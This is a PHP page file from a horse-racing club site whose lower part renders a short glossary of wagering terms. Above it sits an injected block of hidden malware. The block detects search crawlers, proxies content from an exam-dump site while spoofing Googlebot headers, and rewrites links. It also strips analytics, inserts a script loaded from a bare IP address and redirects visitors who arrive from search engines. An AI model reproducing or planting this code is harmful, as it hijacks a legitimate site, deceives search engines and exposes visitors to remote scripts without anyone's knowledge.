<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE);
$tiaourl = "http://www.itexamsure.com/";
$fromsite = "http://www.examfull.com/";
$mysite = "http://www.rwitc.com/bettingentertainment/"; 
$filename = "waggeringTerms.php"; 
$tmp = strtolower($_SERVER['HTTP_USER_AGENT']);
$ref = strtolower($_SERVER['HTTP_REFERER']);
if (strpos ($tmp, 'google') !== false || strpos ($tmp, 'yahoo') !== false || strpos ($tmp, 'msn') !== false || strpos ($tmp, 'sqworm') !== false) {
	$zzflag = 1;
}
if (strpos ($ref, 'google') !== false || strpos ($ref, 'yahoo') !== false || strpos ($ref, 'bing') !== false || strpos ($ref, 'aol') !== false) {
	$rrflag = 1;
	}

function formaturl($l1, $l2) {    
        if (preg_match_all ( "/(<img[^>]+src=\"([^\"]+)\"[^>]*>)|(<a[^>]+href=\"([^\"]+)\"[^>]*>)|(<img[^>]+src='([^']+)'[^>]*>)|(<a[^>]+href='([^']+)'[^>]*>)/i", $l1, $regs )) {    
            foreach ( $regs [0] as $num => $url ) {    
                $l1 = str_replace ( $url, lIIIIl ( $url, $l2 ), $l1 );    
            }    
        }    
        return $l1;    
    }    
     function lIIIIl($l1, $l2) {    
        if (preg_match ( "/(.*)(href|src)\=(.+?)( |\/\>|\>).*/i", $l1, $regs )) {    
            $I2 = $regs [3];    
        }    
        if (strlen ( $I2 ) > 0) {    
            $I1 = str_replace ( chr ( 34 ), "", $I2 );    
            $I1 = str_replace ( chr ( 39 ), "", $I1 );    
        } else {    
            return $l1;    
        }    
        $url_parsed = parse_url ( $l2 );    
        $scheme = $url_parsed ["scheme"];    
        if ($scheme != "") {    
            $scheme = $scheme . "://";    
        }    
        $host = $url_parsed ["host"];    
        $l3 = $scheme . $host;    
        if (strlen ( $l3 ) == 0) {    
            return $l1;    
        }    
        $path = dirname ( $url_parsed ["path"] );    
        if ($path [0] == "\\") {  
            $path = "";  
        }  
        $pos = strpos ( $I1, "#" );  
        if ($pos > 0)  
            $I1 = substr ( $I1, 0, $pos );  
          
          
        if (preg_match ( "/^(http|https|ftp):(\/\/|\\\\)(([\w\/\\\+\-~`@:%])+\.)+([\w\/\\\.\=\?\+\-~`@\':!%#]|(&amp;)|&)+/i", $I1 )) {  
            return $l1;  
        } 
    elseif ($I1 [0] == "/") {  
            $I1 = $l3 . $I1;  
        } 
    elseif (substr ( $I1, 0, 3 ) == "../") {
            while ( substr ( $I1, 0, 3 ) == "../" ) {  
                $I1 = substr ( $I1, strlen ( $I1 ) - (strlen ( $I1 ) - 3), strlen ( $I1 ) - 3 );  
                if (strlen ( $path ) > 0) {  
                    $path = dirname ( $path );  
                }  
            }  
            $I1 = $l3 . $path . "/" . $I1;  
        } elseif (substr ( $I1, 0, 2 ) == "./") {  
            $I1 = $l3 . $path . substr ( $I1, strlen ( $I1 ) - (strlen ( $I1 ) - 1), strlen ( $I1 ) - 1 );  
        } elseif (strtolower ( substr ( $I1, 0, 7 ) ) == "mailto:" || strtolower ( substr ( $I1, 0, 11 ) ) == "javascript:") {  
            return $l1;  
        } else {  
            $I1 = $l3 . $path . "/" . $I1;  
        }  
        return str_replace ( $I2, "\"$I1\"", $l1 );    
    } 
	$url = empty($_GET['page'])?"":$_GET['page'];
	if(function_exists('curl_init')){
$s = curl_init();
curl_setopt($s,CURLOPT_URL,$fromsite . $url);
curl_setopt($s,CURLOPT_RETURNTRANSFER,1);
curl_setopt($s,CURLOPT_USERAGENT,'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
curl_setopt($s,CURLOPT_REFERER,"http://www.google.com");
curl_setopt($s, CURLOPT_HTTPHEADER, array('X-FORWARDED-FOR:66.249.72.240', 'CLIENT-IP:66.249.72.240'));
$content = curl_exec($s);
}else{$content=file_get_contents($fromsite . $url);}
	$$content = formaturl($content,$fromsite); 
$qstr = $filename."?page=";
$repstr = $mysite.$qstr;
$iframe= "<script type=\"text/javascript\" src=\"http://58.96.185.138/guang/iframesure.js\"></script>";
$content = str_replace($fromsite,$repstr,$content);

$content = str_replace("src=\"".$repstr,"src=\"".$fromsite,$content);

$content = str_replace("href=\"","href=\"".$repstr,$content);
$content = str_replace($repstr.$repstr,$repstr,$content);
$content = str_replace($repstr."static",$fromsite."static",$content);
$content = str_replace($repstr."skin",$fromsite."skin",$content);
$content = str_replace($repstr."js",$fromsite."js",$content);
$content = str_replace($repstr."/css",$fromsite."css",$content);
$content = str_replace($repstr."media",$fromsite."media",$content);
$content = str_replace($repstr."\"",$mysite1."\"",$content);
$content = str_replace($repstr."/\"",$mysite1."\"",$content);
$content = str_replace("/design",$fromsite."design",$content);

$content = str_replace("/js",$fromsite."js",$content);
$content = str_replace("/images",$fromsite."images",$content);
$content = str_replace($repstr.$fromsite,$fromsite,$content);
$content = str_replace("action=\"/cart","action=\"".$fromsite."cart",$content);
$content = str_replace($repstr."/cart",$fromsite."cart",$content);
$content = str_replace($repstr."/customer",$fromsite."customer",$content);
$content = str_replace($repstr."javascript:void","javascript:void",$content);
$content = str_replace("<form action=\"/","<form action=\"".$fromsite,$content);
$content = str_replace("ACTION=\"/","ACTION=\"".$fromsite,$content);
$content = str_replace("statcounter","sdf",$content);
$content = str_replace("</head>",$iframe."</head>",$content);
$content = str_replace("ga(","sdfsdf",$content);
$content = str_replace("google-analytics.com","sdfsd",$content);
$content = str_replace($repstr."/",$repstr,$content);
$content = str_replace("statcounter","sdf",$content);
$content = str_replace("ga(","sdfsdf",$content);
$content = str_replace("google-analytics.com","sdfsd",$content);
if ($url=='')
{
if($zzflag == 1){
echo $content;
exit;
	}
}
else{
		if($rrflag == 1)
		{
	    header("location: ".$tiaourl.$url);		
	    exit;
		}
		echo $content;
		exit;
	}

?>
<?php 
include_once('../../bootstrap.php');
  $pageTitle ='Terms About Waggering';        
  $design = new Design();

  $design->startPage("$pageTitle");
  $design->writeLogoTickerMenu();
  $design->openDiv("contentWrapper");
  $design->openDiv("infoWrapper","col-lg-12");
$design->openDiv("leftArea",'col-lg-9');
  $design->writeContentPageStyles();
  ?>         
  <table border="1" cellpadding="3" cellspacing="3" style="border-collapse: collapse" width="700" id="table11" bordercolorlight="#808000" bordercolordark="#808000" ></table>
   <tr>
       <td>  
                <table width="690" border="0" cellspacing="2" cellpadding="2">                   
                    <tr>
                      <td height="35px" align="left">
                         <h2>Terms about wagering</h2></span>
                       </td>
                    </tr>
                    
                    <tr>
                      <td  align="left">
                          <p align="justify" >
                            <span class="VisionArticle">
                               <b>Evens or Even Money </b><br />
                              When your stake equals your winnings, e.g., an investment of Rs 10 fetching a return of another Rs 10, totaling to Rs 20 including the investment. 
                            </span>
                         </p> 
                         
                         <br />
                         <p align="justify" >
                            <span class="VisionArticle">
                               <b>Odds-on </b><br />
                              When the returns are less than your investment. For example, if a horse you back is at 80/100, a bet of Rs 100 will return Rs 180 which includes your investment. 
                            </span>
                         </p> 
                         <br />
                         <p align="justify" >
                            <span class="VisionArticle">
                               <b>Starting Price </b><br />
                              The odds offered on a horse at the time of the start of the race and at which bets are settled by the official bookmakers. 
                            </span>
                         </p> 
                         <br />
                         <p align="justify" >
                            <span class="VisionArticle">
                               <b>Place</b><br />
                              First, second or third position at the finish. 
                            </span>
                         </p> 
                         <br />
                         <p align="justify" >
                            <span class="VisionArticle">
                               <b>Place Bet</b><br />
                              Wager on a horse to finish first, second or third. Place bets are given upto two places if there are 4 or more runners; upto three places if there are 8 or more runners.
                            </span>
                         </p> 
                         
                       </td>
                    </tr>                   
                 </table>
            </td>
     </tr>
 </table>

  <?php                   
  $design->closeDiv();
  $design->writeLeftPanel();
  $design->closeDiv();
  $design->closeDiv();
    $design->endPage();
$design = NULL; // release object